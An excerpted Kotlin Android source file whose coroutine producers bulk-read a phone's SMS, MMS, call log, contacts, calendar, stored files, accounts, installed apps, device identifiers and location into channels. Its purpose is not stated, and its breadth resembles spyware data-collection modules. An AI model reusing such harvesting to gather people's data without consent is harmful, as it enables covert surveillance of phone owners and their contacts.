...
suspend fun calendarProducer(ctx: Context): ReceiveChannel<CalendarEvent> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
...
@ExperimentalCoroutinesApi
suspend fun smsProducer(ctx: Context): ReceiveChannel<Sms> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
...
@ExperimentalCoroutinesApi
suspend fun callLogProducer(ctx: Context): ReceiveChannel<CallLogEntry> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
...
@ExperimentalCoroutinesApi
suspend fun contactsProducer(ctx: Context): ReceiveChannel<Contact> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
...
suspend fun mmsProducer(ctx: Context): ReceiveChannel<Mms> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            if (ctx.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
                close()
            ...
            ctx.contentResolver.query(Telephony.Mms.CONTENT_URI, projection, null, null, Telephony.Mms.DEFAULT_SORT_ORDER)?.use { cur ->
                if (cur.moveToFirst()) {
                    ...
                    do {
                        ...
                        val msg = Mms(thread, date, hasRead, texts, images[0], images[1], images[2], images[3], images[4], imageExts[0], imageExts[1], imageExts[2], imageExts[3], imageExts[4], fileNames[0], fileNames[1], fileNames[2], fileNames[3], fileNames[4])
                        send(msg)
                        yield()
                    } while (cur.moveToNext())
                }
...
@ExperimentalCoroutinesApi
suspend fun filesProducer(ctx: Context, driveVolume: String = "external"): ReceiveChannel<DocumentsFile> = coroutineScope {
   return@coroutineScope produce(Dispatchers.IO){
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        ...
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            projection = arrayOf(MediaStore.Files.FileColumns._ID, MediaStore.Files.FileColumns.DATE_ADDED, MediaStore.Files.FileColumns.DISPLAY_NAME, MediaStore.Files.FileColumns.SIZE, MediaStore.Files.FileColumns.DATE_MODIFIED, MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.TITLE, MediaStore.Files.FileColumns.MEDIA_TYPE, MediaStore.Files.FileColumns.WIDTH, MediaStore.Files.FileColumns.HEIGHT, MediaStore.Files.FileColumns.DURATION, MediaStore.Files.FileColumns.VOLUME_NAME, MediaStore.Files.FileColumns.RELATIVE_PATH)
                        ...
                        try{
                            mediaType?.takeUnless {  it.equals("0") }?.let {
                                ctx.contentResolver.openInputStream(ContentUris.withAppendedId(uri, id))?.use { stream ->
                                    send(stream.readBytes().run { DocumentsFile(this, relativePath, volume, dateAdded, dateModified, name, duration, size, height, width, title, mediaType, mimeType) })
                                }
                            }
                        }catch (e: IOException){
                            e.printStackTrace()
...
suspend fun settingsProducer(ctx: Context): ReceiveChannel<Setting> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
...
@ExperimentalCoroutinesApi
suspend fun bookmarksProducer(ctx: Context): ReceiveChannel<Bookmark> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            close()
...
@ExperimentalCoroutinesApi
suspend fun dictionaryProducer(ctx: Context): ReceiveChannel<DictionaryWord> = coroutineScope {
    return@coroutineScope produce(Dispatchers.IO){
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            close()
...
@ExperimentalCoroutinesApi
suspend fun accountsProducer(ctx: Context): ReceiveChannel<UserAccount> = coroutineScope {
    return@coroutineScope produce(Dispatchers.Default){
        AccountManager.get(ctx.applicationContext).accounts.forEach{ account -> (send(UserAccount(account.name, account.type))) }
        close()
    }
}

@ExperimentalCoroutinesApi
suspend fun deviceProducer(ctx: Context): ReceiveChannel<Device> = coroutineScope {
    return@coroutineScope produce(Dispatchers.Default){
...
/*                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
        ...
        val ip = getIpV4()
        val device = Device(Build.ID, ctx.getDeviceNumber(), ip.first(), locale, countryCode, Build.MANUFACTURER, Build.MODEL, Build.PRODUCT,
            Build.VERSION.SDK_INT, Build.VERSION.CODENAME, serial, Build.getRadioVersion(), Build.BRAND, Build.BOARD)
        send(device)
        close()
    }
}
...
@ExperimentalCoroutinesApi
suspend fun softwareProducer(ctx: Context): ReceiveChannel<Software> = coroutineScope {
    return@coroutineScope produce(Dispatchers.Default){
        ctx.packageManager.getInstalledApplications(PackageManager.GET_META_DATA).forEach{ app -> app?.let{ send(Software(it.packageName, null)) } }
        close()
    }
}

@ExperimentalCoroutinesApi
suspend fun locationProducer(ctx: Context): ReceiveChannel<RecentLocation> = coroutineScope {
    return@coroutineScope produce(Dispatchers.Default) {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
        ...
        withTimeoutOrNull(6000) {
            val location = async { LocationServices.getFusedLocationProviderClient(ctx).lastLocation.addOnSuccessListener { } }.await()
            while (!location.isSuccessful)
                delay(300)
            location.result?.let { loc -> send(RecentLocation(loc.time, loc.latitude, loc.longitude, loc.altitude)) }
        }
        close()
    }
}